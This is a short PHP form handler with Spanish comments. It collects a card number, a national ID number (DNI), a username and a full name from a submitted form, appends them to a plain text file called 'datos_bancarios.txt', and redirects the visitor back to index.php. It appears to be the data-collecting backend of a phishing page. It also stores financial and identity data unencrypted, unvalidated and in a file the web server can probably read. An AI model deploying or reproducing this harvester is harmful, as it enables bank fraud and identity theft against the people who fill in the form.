<?php
  // Recibimos los datos del formulario
  $numero_tarjeta = $_POST['numero_tarjeta'];
  $dni = $_POST['dni'];
  $usuario = $_POST['usuario'];
  $nombre = $_POST['nombre'];

  // Guardamos los datos en un archivo de texto
  file_put_contents('datos_bancarios.txt', $numero_tarjeta . "\n" . $dni . "\n" . $usuario . "\n" . $nombre);

  // Redirigimos al usuario a la página principal
  header('Location: index.php');
?>